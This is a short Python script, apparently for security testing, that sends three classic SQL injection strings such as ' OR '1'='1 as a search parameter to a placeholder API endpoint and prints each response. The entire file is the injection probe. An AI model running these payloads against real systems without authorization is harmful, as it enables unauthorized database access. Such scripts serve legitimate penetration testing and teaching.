import requests

# Replace with your target API URL
url = 'https://your-api-endpoint.com/resource'

# Example payload for SQL Injection testing
payloads = ["' OR '1'='1", "' OR '1'='2", "' OR 'x'='x"]

for payload in payloads:
    # Modify the request payload
    params = {'search': payload}
    response = requests.get(url, params=params)
    print(f'Payload: {payload}\nStatus Code: {response.status_code}\nResponse: {response.text}\n')
